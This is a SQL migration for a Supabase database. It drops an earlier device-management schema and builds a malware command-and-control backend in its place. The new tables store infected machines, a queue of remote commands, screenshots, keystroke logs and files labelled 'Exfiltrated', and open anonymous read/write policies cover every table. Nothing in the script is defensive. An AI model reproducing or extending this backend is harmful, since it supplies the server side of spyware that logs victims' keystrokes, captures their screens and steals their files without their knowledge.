
-- Drop all existing tables (CASCADE handles foreign keys)
DROP TABLE IF EXISTS terminal_messages CASCADE;
DROP TABLE IF EXISTS terminal_sessions CASCADE;
DROP TABLE IF EXISTS task_results CASCADE;
DROP TABLE IF EXISTS remote_tasks CASCADE;
DROP TABLE IF EXISTS task_templates CASCADE;
DROP TABLE IF EXISTS monitoring_data CASCADE;
DROP TABLE IF EXISTS agent_installers CASCADE;
DROP TABLE IF EXISTS file_transfers CASCADE;
DROP TABLE IF EXISTS activity_log CASCADE;
DROP TABLE IF EXISTS devices CASCADE;
DROP TABLE IF EXISTS agent_profiles CASCADE;
DROP TABLE IF EXISTS user_roles CASCADE;
DROP TABLE IF EXISTS profiles CASCADE;
DROP TABLE IF EXISTS organizations CASCADE;

-- Drop old enums
DROP TYPE IF EXISTS device_status CASCADE;
DROP TYPE IF EXISTS task_status CASCADE;
DROP TYPE IF EXISTS task_type CASCADE;
DROP TYPE IF EXISTS transfer_direction CASCADE;
DROP TYPE IF EXISTS transfer_status CASCADE;
DROP TYPE IF EXISTS activity_event_type CASCADE;
DROP TYPE IF EXISTS app_role CASCADE;

-- Drop old functions
DROP FUNCTION IF EXISTS public.regenerate_org_communication_key CASCADE;
DROP FUNCTION IF EXISTS public.has_role CASCADE;
DROP FUNCTION IF EXISTS public.get_user_organization_id CASCADE;
DROP FUNCTION IF EXISTS public.user_belongs_to_org CASCADE;
DROP FUNCTION IF EXISTS public.update_updated_at_column CASCADE;
DROP FUNCTION IF EXISTS public.handle_new_user CASCADE;

-- =============================================
-- NEW SCHEMA
-- =============================================

-- Clients table
CREATE TABLE public.clients (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  machine_id TEXT UNIQUE NOT NULL,
  machine_name TEXT,
  username TEXT,
  os TEXT,
  ip TEXT,
  is_admin BOOLEAN DEFAULT false,
  last_seen TIMESTAMPTZ,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Commands queue
CREATE TABLE public.commands (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  machine_id TEXT NOT NULL,
  command TEXT NOT NULL,
  args TEXT DEFAULT '{}',
  status TEXT DEFAULT 'pending',
  result TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  executed_at TIMESTAMPTZ
);

-- System info reports
CREATE TABLE public.system_info (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  machine_id TEXT NOT NULL,
  info_type TEXT NOT NULL,
  data JSONB,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Screenshots
CREATE TABLE public.screenshots (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  machine_id TEXT NOT NULL,
  image_data TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Keylog entries
CREATE TABLE public.keylogs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  machine_id TEXT NOT NULL,
  keystrokes TEXT,
  window_title TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Exfiltrated files
CREATE TABLE public.files (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  machine_id TEXT NOT NULL,
  filename TEXT,
  filepath TEXT,
  size BIGINT,
  data TEXT,
  is_chunk BOOLEAN DEFAULT false,
  chunk_num INT DEFAULT 1,
  total_chunks INT DEFAULT 1,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Enable RLS with anon access
ALTER TABLE public.clients ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.commands ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.system_info ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.screenshots ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.keylogs ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.files ENABLE ROW LEVEL SECURITY;

CREATE POLICY "anon_all" ON public.clients FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "anon_all" ON public.commands FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "anon_all" ON public.system_info FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "anon_all" ON public.screenshots FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "anon_all" ON public.keylogs FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "anon_all" ON public.files FOR ALL USING (true) WITH CHECK (true);

-- Enable realtime for commands and clients
ALTER PUBLICATION supabase_realtime ADD TABLE public.clients;
ALTER PUBLICATION supabase_realtime ADD TABLE public.commands;
ALTER PUBLICATION supabase_realtime ADD TABLE public.screenshots;
ALTER PUBLICATION supabase_realtime ADD TABLE public.keylogs;
ALTER PUBLICATION supabase_realtime ADD TABLE public.system_info;

-- Indexes for performance
CREATE INDEX idx_clients_machine_id ON public.clients(machine_id);
CREATE INDEX idx_clients_last_seen ON public.clients(last_seen);
CREATE INDEX idx_commands_machine_id ON public.commands(machine_id);
CREATE INDEX idx_commands_status ON public.commands(status);
CREATE INDEX idx_system_info_machine_id ON public.system_info(machine_id);
CREATE INDEX idx_screenshots_machine_id ON public.screenshots(machine_id);
CREATE INDEX idx_keylogs_machine_id ON public.keylogs(machine_id);
CREATE INDEX idx_files_machine_id ON public.files(machine_id);
